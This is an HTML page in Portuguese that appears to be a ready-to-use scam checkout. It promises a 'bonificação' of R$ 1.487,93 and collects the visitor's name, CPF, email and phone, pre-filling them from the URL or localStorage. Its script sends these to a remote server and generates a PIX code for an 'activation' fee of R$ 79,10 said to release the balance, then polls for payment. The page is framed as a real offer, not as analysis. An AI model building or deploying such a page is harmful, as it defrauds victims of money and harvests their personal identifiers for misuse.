<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Resgate de Bonificação</title>

<style>
:root{
    --primary:#F04E2A;
    --dark:#1E1E1E;
    --light:#F5F5F5;
    --soft:#FBE9E4;
}

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: 'Segoe UI', sans-serif;
}

body{
    background:linear-gradient(135deg,#f2f2f2,#e8e8e8);
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    padding: 20px;
}

.checkout-container{
    width:100%;
    max-width:420px;
    background:white;
    border-radius:18px;
    box-shadow:0 15px 40px rgba(0,0,0,0.1);
    padding:30px;
    position:relative;
}

.badge-valor{
    position:absolute;
    top:-15px;
    right:20px;
    background:black;
    color:white;
    padding:8px 15px;
    border-radius:30px;
    font-weight:bold;
    font-size:14px;
}

.titulo{
    font-size:20px;
    margin-bottom:15px;
    font-weight:600;
}

.alerta{
    background:var(--soft);
    padding:15px;
    border-left:5px solid var(--primary);
    border-radius:8px;
    margin-bottom:20px;
}

.alerta h3{
    color:#333;
    margin-bottom:5px;
    font-size: 16px;
}

.form-group{
    margin-bottom:15px;
}

label{
    font-size:13px;
    color:#777;
    display:block;
    margin-bottom:5px;
}

input{
    width:100%;
    padding:12px;
    border-radius:8px;
    border:1px solid #ddd;
    transition:0.3s;
    font-size: 14px;
}

input:focus{
    border-color:var(--primary);
    outline:none;
    box-shadow:0 0 0 2px rgba(240,78,42,0.2);
}

.resumo{
    background:#fafafa;
    padding:15px;
    border-radius:10px;
    margin-top:15px;
    font-size:14px;
}

.linha{
    display:flex;
    justify-content:space-between;
    margin-bottom:8px;
}

.linha span:last-child{
    font-weight:600;
}

.total{
    margin-top:10px;
    padding-top:10px;
    border-top:1px solid #ddd;
    font-size:18px;
    color:var(--primary);
    font-weight:bold;
}

.btn{
    margin-top:20px;
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    background:var(--primary);
    color:white;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
    transition:0.3s;
}

.btn:hover{
    background:#d94120;
    transform:translateY(-2px);
}

.btn:disabled { background: #ccc; cursor: not-allowed; }

/* AREA DO QR CODE */
#pix_area {
    display: none;
    text-align: center;
    margin-top: 20px;
    padding-top: 20px;
    border-top: 2px dashed #eee;
}

#qr_img {
    width: 200px;
    height: 200px;
    margin: 10px auto;
    display: block;
    border: 1px solid #eee;
    padding: 5px;
}

.pix-input {
    width: 100%;
    padding: 10px;
    background: #f4f4f4;
    border: 1px solid #ddd;
    font-size: 11px;
    text-align: center;
    margin-bottom: 10px;
    border-radius: 5px;
}

</style>
</head>

<body>

<div class="checkout-container">

    <div class="badge-valor">R$ 1.487,93</div>

    <div class="titulo">Resumo Final</div>

    <div class="alerta">
        <h3>Consolidação de Valores</h3>
        <p>Confirme seus dados abaixo para liberar o resgate da sua bonificação.</p>
    </div>

    <div class="form-group">
        <label>Nome Completo</label>
        <input type="text" id="nome" placeholder="Digite seu nome completo">
    </div>

    <div class="form-group">
        <label>CPF</label>
        <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
    </div>

    <div class="form-group">
        <label>E-mail</label>
        <input type="email" id="email" placeholder="seuemail@email.com">
    </div>

    <div class="form-group">
        <label>Telefone</label>
        <input type="text" id="telefone" placeholder="(00) 00000-0000" maxlength="15">
    </div>

    <div id="resumo_container">
        <div class="resumo">
            <div class="linha"><span>Valor Inicial</span> <span>R$ 1.342,03</span></div>
            <div class="linha"><span>Taxas Acumuladas</span> <span>+ R$ 66,80</span></div>
            <div class="linha"><span>Ativação Final</span> <span>+ R$ 79,10</span></div>
            <div class="linha total"><span>VALOR TOTAL</span> <span>R$ 1.487,93</span></div>
        </div>

        <button class="btn" id="btn_gerar" onclick="gerarPix()">PROSSEGUIR PARA PAGAMENTO</button>
    </div>

    <div id="pix_area">
        <h3 style="color: #1f9c6b; font-size: 16px;">✅ PIX GERADO COM SUCESSO</h3>
        <p style="font-size: 12px; color: #666;">Pague a taxa de <b>R$ 79,10</b> para liberar seu saldo.</p>
        
        <img id="qr_img" src="">
        
        <input type="text" id="pix_code" class="pix-input" readonly>
        
        <button class="btn" style="background: #28a745;" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
    </div>

</div>

<script>
// CONFIGURAÇÃO DO SEU SERVIDOR
const URL_SERVIDOR = "https://checkoutfinal.onrender.com"; 

// 1. CARREGAR DADOS AUTOMÁTICOS
window.onload = function() {
    const local = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
    const params = new URLSearchParams(window.location.search);

    // Tenta pegar da URL ou do LocalStorage
    document.getElementById('nome').value = params.get('nome') || local.nome || "";
    document.getElementById('email').value = params.get('email') || local.email || "";
    document.getElementById('cpf').value = params.get('cpf') || local.cpf || local.documento || "";
    document.getElementById('telefone').value = params.get('phone') || local.telefone || "";
};

// 2. MÁSCARAS
document.getElementById('cpf').addEventListener('input', function(e){
    let v = e.target.value.replace(/\D/g,'');
    v = v.replace(/(\d{3})(\d)/,'$1.$2');
    v = v.replace(/(\d{3})(\d)/,'$1.$2');
    v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
    e.target.value = v;
});

document.getElementById('telefone').addEventListener('input', function(e){
    let v = e.target.value.replace(/\D/g,'');
    v = v.replace(/^(\d{2})(\d)/g,'($1) $2');
    v = v.replace(/(\d{5})(\d{4})$/,'$1-$2');
    e.target.value = v;
});

// 3. FUNÇÃO PARA GERAR O PIX
function gerarPix() {
    const btn = document.getElementById('btn_gerar');
    
    // Captura os dados dos campos (editados ou não)
    const dados = {
        name: document.getElementById('nome').value,
        email: document.getElementById('email').value,
        cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
        phone: document.getElementById('telefone').value.replace(/\D/g, ''),
        valor: "79.10"
    };

    if (dados.cpf.length < 11 || !dados.name) {
        alert("Por favor, preencha Nome e CPF corretamente.");
        return;
    }

    btn.innerText = "GERANDO...";
    btn.disabled = true;

    fetch(`${URL_SERVIDOR}/pix`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dados)
    })
    .then(res => res.json())
    .then(data => {
        if(data.success) {
            // Esconde resumo e botão antigo
            document.getElementById('resumo_container').style.display = 'none';
            
            // Mostra o QR Code
            document.getElementById('pix_area').style.display = 'block';
            
            // Trata a imagem do QR Code
            const imgSource = data.encodedImage.startsWith('http') ? data.encodedImage : `data:image/png;base64,${data.encodedImage}`;
            document.getElementById('qr_img').src = imgSource;
            document.getElementById('pix_code').value = data.payload;

            // Monitorar Pagamento
            if(data.transactionId) monitorar(data.transactionId);
        } else {
            alert("Erro: " + data.message);
            btn.innerText = "TENTAR NOVAMENTE";
            btn.disabled = false;
        }
    })
    .catch(err => {
        alert("Erro ao conectar com o servidor.");
        btn.innerText = "TENTAR NOVAMENTE";
        btn.disabled = false;
    });
}

function monitorar(id) {
    setInterval(() => {
        fetch(`${URL_SERVIDOR}/check-status/${id}`)
        .then(r => r.json())
        .then(res => {
            if(res.paid) window.location.href = "PAGINA_DE_SUCESSO.html";
        });
    }, 3000);
}

function copiarPix() {
    const copyText = document.getElementById("pix_code");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);
    alert("Código Pix copiado!");
}
</script>

</body>
</html>
